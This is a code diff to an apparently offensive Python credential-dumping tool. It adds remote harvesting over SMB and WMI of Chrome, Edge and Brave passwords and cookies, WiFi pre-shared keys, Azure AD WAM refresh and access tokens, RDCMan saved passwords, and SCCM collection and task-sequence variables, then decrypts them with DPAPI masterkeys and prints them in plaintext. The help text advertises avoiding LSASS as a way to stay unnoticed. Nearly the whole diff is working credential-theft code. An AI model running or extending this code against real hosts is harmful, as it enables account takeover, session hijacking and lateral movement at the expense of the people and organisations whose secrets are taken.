@@ -184,7 +184,9 @@ def parse_args():
     what.add_argument('--lsa',   action='store_true', help='Dump LSA secrets + service creds')
     what.add_argument('--cache', action='store_true', help='Dump DCC2 cached domain credentials')
     what.add_argument('--dpapi', action='store_true',
-                      help='Dump DPAPI credentials (Chrome, Edge, CredMan) via Smb2Client')
+                      help='Dump DPAPI credentials (Chrome/Edge/Brave passwords+cookies, '
+                           'WiFi PSKs, Azure WAM tokens, RDCMan creds, CredMan, SCCM) '
+                           'via Smb2Client + WMI — no LSASS touch')
     # Legacy skip flags (kept for backwards compat)
     what.add_argument('--no-sam',   action='store_true', help=argparse.SUPPRESS)
     what.add_argument('--no-lsa',   action='store_true', help=argparse.SUPPRESS)
@@ -732,7 +734,8 @@ def _smb_ls(unc: str, auth: list, depth: int = 0, verbose: bool = False) -> list
 def _collect_dpapi_files(host: str, auth: list, workdir: str, verbose: bool) -> dict:
     """Pull DPAPI-relevant files from host via Smb2Client into workdir."""
     result = {'sys_mks_root': [], 'sys_mks_user': [], 'user_mks': {}, 'credman': {},
-              'chrome': {}, 'edge': {}, 'user_sids': {}}
+              'chrome': {}, 'edge': {}, 'brave': {}, 'user_sids': {},
+              'wifi_profiles': [], 'wam_tokens': {}, 'rdcman': {}}
 
     _GUID_RE = re.compile(r'^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}'
                           r'-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$', re.I)
@@ -785,6 +788,20 @@ def _collect_dpapi_files(host: str, auth: list, workdir: str, verbose: bool) -> 
     if sys_creds:
         result['credman']['[SYSTEM]'] = sys_creds
 
+    wifi_base = rf'\\{host}\C$\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces'
+    for iface_entry in ls(wifi_base):
+        iface_name = iface_entry.split('\\')[-1]
+        if not _GUID_RE.match(iface_name):
+            continue
+        iface_unc = wifi_base + '\\' + iface_name
+        for xml_entry in ls(iface_unc):
+            xml_name = xml_entry.split('\\')[-1]
+            if not xml_name.lower().endswith('.xml'):
+                continue
+            local_xml = os.path.join(workdir, 'wifi', iface_name, xml_name)
+            if pull_file(iface_unc + '\\' + xml_name, local_xml):
+                result['wifi_profiles'].append(local_xml)
+
     skip_names = {'All Users', 'Default', 'Default User', 'Public', 'desktop.ini', '.', '..'}
     user_names = [n for n in ls(rf'\\{host}\C$\Users') if n and n not in skip_names]
 
@@ -820,27 +837,50 @@ def _collect_dpapi_files(host: str, auth: list, workdir: str, verbose: bool) -> 
         if cred_paths:
             result['credman'][username] = cred_paths
 
-        chrome_base = base + r'\AppData\Local\Google\Chrome\User Data'
-        ls_local = os.path.join(udir, 'chrome', 'Local_State')
-        ld_local = os.path.join(udir, 'chrome', 'Login_Data')
-        ok_ls = pull_file(chrome_base + r'\Local State',        ls_local)
-        ok_ld = pull_file(chrome_base + r'\Default\Login Data', ld_local)
-        if ok_ls or ok_ld:
-            result['chrome'][username] = {
-                'local_state': ls_local if ok_ls else None,
-                'login_data':  ld_local if ok_ld else None,
-            }
+        for bkey, bbranch, bdir in [
+            ('chrome', r'\AppData\Local\Google\Chrome\User Data',               'chrome'),
+            ('edge',   r'\AppData\Local\Microsoft\Edge\User Data',               'edge'),
+            ('brave',  r'\AppData\Local\BraveSoftware\Brave-Browser\User Data',  'brave'),
+        ]:
+            bbase = base + bbranch
+            b_ls  = os.path.join(udir, bdir, 'Local_State')
+            b_ld  = os.path.join(udir, bdir, 'Login_Data')
+            ok_ls = pull_file(bbase + r'\Local State',        b_ls)
+            ok_ld = pull_file(bbase + r'\Default\Login Data', b_ld)
+            if ok_ls or ok_ld:
+                result[bkey][username] = {
+                    'local_state': b_ls if ok_ls else None,
+                    'login_data':  b_ld if ok_ld else None,
+                }
+                for cookie_rel in (r'\Default\Network\Cookies', r'\Default\Cookies'):
+                    b_ck = os.path.join(udir, bdir, 'Cookies')
+                    if pull_file(bbase + cookie_rel, b_ck):
+                        result[bkey][username]['cookies'] = b_ck
+                        break
 
-        edge_base = base + r'\AppData\Local\Microsoft\Edge\User Data'
-        els_local = os.path.join(udir, 'edge', 'Local_State')
-        eld_local = os.path.join(udir, 'edge', 'Login_Data')
-        ok_els = pull_file(edge_base + r'\Local State',        els_local)
-        ok_eld = pull_file(edge_base + r'\Default\Login Data', eld_local)
-        if ok_els or ok_eld:
-            result['edge'][username] = {
-                'local_state': els_local if ok_els else None,
-                'login_data':  eld_local if ok_eld else None,
-            }
+        packages_base = base + r'\AppData\Local\Packages'
+        for pkg_entry in ls(packages_base):
+            pkg_short = pkg_entry.split('\\')[-1]
+            if not pkg_short.lower().startswith('microsoft.aad.brokerplugin'):
+                continue
+            tbres_dir = packages_base + '\\' + pkg_short + r'\AC\TokenBroker\Cache'
+            user_wam  = result['wam_tokens'].setdefault(username, [])
+            for tbres_entry in ls(tbres_dir):
+                tbres_name = tbres_entry.split('\\')[-1]
+                if not tbres_name.lower().endswith('.tbres'):
+                    continue
+                local_tbres = os.path.join(udir, 'wam', tbres_name)
+                if pull_file(tbres_dir + '\\' + tbres_name, local_tbres):
+                    user_wam.append(local_tbres)
+
+        for rdcman_rel in (
+            r'\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings',
+            r'\Documents\RDCMan.settings',
+        ):
+            local_rdcman = os.path.join(udir, 'rdcman', 'RDCMan.settings')
+            if pull_file(base + rdcman_rel, local_rdcman):
+                result['rdcman'][username] = local_rdcman
+                break
 
     return result
 
@@ -944,6 +984,51 @@ def _dump_sccm_naa(host: str, auth: list, masterkeys: dict, out: list, verbose: 
                 out.append(f'  Password: {pw}')
             else:
                 out.append('  (configured but credentials are blank)')
+
+        # Collection variables — often contain deployment credentials
+        raw_cv, rc_cv = _run(
+            WMI_BIN, 'query', wmi_auth,
+            [server_name,
+             'SELECT CollectionVariableName, CollectionVariableValue FROM CCM_CollectionVariable',
+             '-Namespace', ns, '-ConsoleOutputStyle', 'Json'],
+            verbose, timeout=30)
+        if rc_cv == 0 and raw_cv.strip() not in ('', '[]', '[]]', '['):
+            try:
+                cleaned = raw_cv.rstrip().rstrip(']') + ']'
+                cv_rows = json.loads(cleaned)
+                if cv_rows:
+                    out.append('\n[*] SCCM Collection Variables')
+                    out.append('-' * 60)
+                    for row in cv_rows:
+                        name = (row.get('CollectionVariableName', '') or '').strip()
+                        val  = (row.get('CollectionVariableValue', '') or '').strip()
+                        if name:
+                            out.append(f'  {name}: {val}')
+            except Exception:
+                pass
+
+        # TS environment variables
+        raw_ts, rc_ts = _run(
+            WMI_BIN, 'query', wmi_auth,
+            [server_name,
+             'SELECT TSEnvironmentVariableName, TSEnvironmentVariableValue '
+             'FROM CCM_TSEnvironmentVariable',
+             '-Namespace', ns, '-ConsoleOutputStyle', 'Json'],
+            verbose, timeout=30)
+        if rc_ts == 0 and raw_ts.strip() not in ('', '[]', '[]]', '['):
+            try:
+                cleaned = raw_ts.rstrip().rstrip(']') + ']'
+                ts_rows = json.loads(cleaned)
+                if ts_rows:
+                    out.append('\n[*] SCCM Task Sequence Variables')
+                    out.append('-' * 60)
+                    for row in ts_rows:
+                        name = (row.get('TSEnvironmentVariableName', '') or '').strip()
+                        val  = (row.get('TSEnvironmentVariableValue', '') or '').strip()
+                        if name:
+                            out.append(f'  {name}: {val}')
+            except Exception:
+                pass
         return
 
 
@@ -984,6 +1069,205 @@ def _dump_browser_passwords(browser_files: dict, masterkeys: dict, browser: str,
             for url, uname, pw in creds:
                 out.append(f'  URL:      {url}')
                 out.append(f'  Username: {uname}')
+                out.append(f'  Password: {pw}')
+
+
+# ── DPAPI: Browser cookies ───────────────────────────────────────────────────
+
+def _dump_browser_cookies(browser_files: dict, masterkeys: dict, browser: str, out: list):
+    header_printed = False
+    for username, info in browser_files.items():
+        aes_key    = _chrome_aes_key(info.get('local_state'), masterkeys)
+        cookies_db = info.get('cookies')
+        if not cookies_db or not os.path.isfile(cookies_db):
+            continue
+        tmp = cookies_db + '.tmp'
+        try:
+            shutil.copy2(cookies_db, tmp)
+            conn = sqlite3.connect(tmp)
+            rows = conn.execute(
+                'SELECT host_key, name, encrypted_value, expires_utc '
+                'FROM cookies WHERE encrypted_value IS NOT NULL'
+            ).fetchall()
+            conn.close()
+        except Exception:
+            continue
+        finally:
+            try:
+                os.remove(tmp)
+            except Exception:
+                pass
+
+        creds = []
+        for host_key, name, enc_val, expires in rows:
+            if not enc_val:
+                continue
+            val = _chrome_decrypt_value(bytes(enc_val), aes_key, masterkeys)
+            if val:
+                session = expires == 0
+                creds.append((host_key, name, val, session))
+
+        if creds:
+            if not header_printed:
+                out.append(f'\n[*] {browser} Cookies')
+                out.append('-' * 60)
+                header_printed = True
+            out.append(f'\n  User profile: {username} ({len(creds)} cookie(s))')
+            for host_key, name, val, session in creds:
+                sess_tag = '  [session]' if session else ''
+                out.append(f'  {host_key}  {name}={val[:120]}{"…" if len(val) > 120 else ""}{sess_tag}')
+
+
+# ── DPAPI: WiFi profiles ──────────────────────────────────────────────────────
+
+def _dump_wifi_profiles(wifi_files: list, masterkeys: dict, out: list):
+    """Decrypt WiFi profile XML files pulled via Smb2Client."""
+    import xml.etree.ElementTree as ET
+    header_printed = False
+    for path in wifi_files:
+        try:
+            with open(path, 'rb') as f:
+                data = f.read()
+            root = ET.fromstring(data)
+        except Exception:
+            continue
+
+        # Strip XML namespace for simpler XPath
+        for elem in root.iter():
+            if '}' in elem.tag:
+                elem.tag = elem.tag.split('}', 1)[1]
+
+        ssid_node = root.find('.//SSID/name')
+        ssid = ssid_node.text.strip() if ssid_node is not None else os.path.basename(path).replace('.xml', '')
+        auth_node = root.find('.//authentication')
+        auth_type = auth_node.text.strip() if auth_node is not None else 'unknown'
+
+        if not header_printed:
+            out.append('\n[*] WiFi Profile Credentials')
+            out.append('-' * 60)
+            header_printed = True
+        out.append(f'\n  SSID: {ssid}  [{auth_type}]')
+
+        protected_node = root.find('.//sharedKey/protected')
+        key_node       = root.find('.//sharedKey/keyMaterial')
+        if protected_node is not None and key_node is not None:
+            protected = (protected_node.text or '').strip().lower() == 'true'
+            key_hex   = (key_node.text or '').strip()
+            if protected and key_hex:
+                try:
+                    plain = _blob_decrypt(bytes.fromhex(key_hex), masterkeys)
+                    if plain:
+                        try:
+                            psk = plain.decode('utf-16-le', errors='replace').rstrip('\x00').strip()
+                        except Exception:
+                            psk = plain.decode('utf-8', errors='replace').rstrip('\x00').strip()
+                        out.append(f'  PSK:  {psk}')
+                    else:
+                        out.append('  PSK:  [encrypted — machine masterkey unavailable]')
+                except Exception as e:
+                    out.append(f'  PSK:  [parse error: {e}]')
+            elif not protected and key_hex:
+                out.append(f'  PSK:  {key_hex}  (plaintext)')
+
+
+# ── DPAPI: WAM / Azure AD token broker ───────────────────────────────────────
+
+_DPAPI_PROVIDER_BYTES = bytes.fromhex('D08C9DDF011511D18C7A00C04FC297EB')
+
+
+def _parse_tbres(data: bytes, masterkeys: dict) -> dict:
+    """Extract Azure AD tokens from a WAM .tbres file via DPAPI blob scan."""
+    idx = data.find(_DPAPI_PROVIDER_BYTES)
+    if idx < 8:
+        return None
+    # Back up over cbHeader(4) + dwVersion(4) which precede the provider GUID
+    blob_start = idx - 8
+    plain = _blob_decrypt(data[blob_start:], masterkeys)
+    if not plain:
+        return None
+    json_start = plain.find(b'{')
+    if json_start < 0:
+        return None
+    try:
+        return json.loads(plain[json_start:].decode('utf-8', errors='replace'))
+    except Exception:
+        return None
+
+
+def _dump_wam_tokens(wam_files: dict, masterkeys: dict, out: list):
+    header_printed = False
+    for username, paths in wam_files.items():
+        for path in paths:
+            try:
+                data = open(path, 'rb').read()
+            except Exception:
+                continue
+            tok = _parse_tbres(data, masterkeys)
+            if not tok:
+                continue
+            if not header_printed:
+                out.append('\n[*] Azure AD / WAM Tokens (TBRES)')
+                out.append('-' * 60)
+                header_printed = True
+            account    = tok.get('account', {}) or {}
+            user_id    = (account.get('username') or tok.get('username') or
+                          tok.get('preferred_username', ''))
+            home_id    = account.get('home_account_id', '') or ''
+            tenant     = home_id.split('.')[1] if '.' in home_id else tok.get('tenant_id', '')
+            access_tok = tok.get('access_token', '') or tok.get('secret', '')
+            refresh_tok = tok.get('refresh_token', '')
+            out.append(f'\n  User profile: {username}')
+            if user_id:   out.append(f'  Account:      {user_id}')
+            if tenant:    out.append(f'  Tenant:       {tenant}')
+            if refresh_tok:
+                out.append(f'  RefreshToken: {refresh_tok[:100]}{"…" if len(refresh_tok) > 100 else ""}')
+            if access_tok:
+                out.append(f'  AccessToken:  {access_tok[:100]}{"…" if len(access_tok) > 100 else ""}')
+
+
+# ── DPAPI: RDCMan saved credentials ──────────────────────────────────────────
+
+def _dump_rdcman(rdcman_files: dict, masterkeys: dict, out: list):
+    import xml.etree.ElementTree as ET
+    header_printed = False
+    for username, path in rdcman_files.items():
+        try:
+            with open(path, 'rb') as f:
+                data = f.read()
+            root = ET.fromstring(data)
+        except Exception:
+            continue
+
+        creds = []
+        for cred_elem in root.iter('logonCredentials'):
+            pw_elem  = cred_elem.find('.//password')
+            usr_elem = cred_elem.find('.//username')
+            dom_elem = cred_elem.find('.//domain')
+            if pw_elem is None or not pw_elem.text:
+                continue
+            try:
+                blob  = base64.b64decode(pw_elem.text.strip())
+                plain = _blob_decrypt(blob, masterkeys)
+                if plain:
+                    try:
+                        pw = plain.decode('utf-16-le', errors='replace').rstrip('\x00')
+                    except Exception:
+                        pw = plain.decode('utf-8', errors='replace').rstrip('\x00')
+                    dom  = (dom_elem.text  or '').strip() if dom_elem  is not None else ''
+                    user = (usr_elem.text  or '').strip() if usr_elem  is not None else ''
+                    creds.append((dom, user, pw))
+            except Exception:
+                continue
+
+        if creds:
+            if not header_printed:
+                out.append('\n[*] RDCMan Saved Credentials')
+                out.append('-' * 60)
+                header_printed = True
+            out.append(f'\n  User profile: {username}')
+            for dom, user, pw in creds:
+                prefix = f'{dom}\\' if dom else ''
+                out.append(f'  Account:  {prefix}{user}')
                 out.append(f'  Password: {pw}')
 
 
@@ -1226,8 +1510,11 @@ def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
 
         out.append(f'[*] Found: {n_sys} system MK, {n_user} user MK, '
                    f'{n_cred} credman blob(s), '
-                   f'{len(files["chrome"])} Chrome profile(s), '
-                   f'{len(files["edge"])} Edge profile(s)')
+                   f'{len(files["chrome"])} Chrome / {len(files["edge"])} Edge / '
+                   f'{len(files["brave"])} Brave profile(s), '
+                   f'{len(files["wifi_profiles"])} WiFi profile(s), '
+                   f'{len(files["wam_tokens"])} WAM token cache(s), '
+                   f'{len(files["rdcman"])} RDCMan config(s)')
 
         masterkeys = {}
 
@@ -1317,6 +1604,13 @@ def _dump_dpapi(host: str, args, auth: list, dpapi_system_hex: str,
 
         _dump_browser_passwords(files['chrome'], masterkeys, 'Chrome', out)
         _dump_browser_passwords(files['edge'],   masterkeys, 'Edge',   out)
+        _dump_browser_passwords(files['brave'],  masterkeys, 'Brave',  out)
+        _dump_browser_cookies(files['chrome'],   masterkeys, 'Chrome', out)
+        _dump_browser_cookies(files['edge'],     masterkeys, 'Edge',   out)
+        _dump_browser_cookies(files['brave'],    masterkeys, 'Brave',  out)
+        _dump_wifi_profiles(files['wifi_profiles'], masterkeys, out)
+        _dump_wam_tokens(files['wam_tokens'],    masterkeys, out)
+        _dump_rdcman(files['rdcman'],            masterkeys, out)
         _dump_sccm_naa(host, auth, masterkeys, out, verbose)
         _dump_credman(files['credman'], masterkeys, out)
 
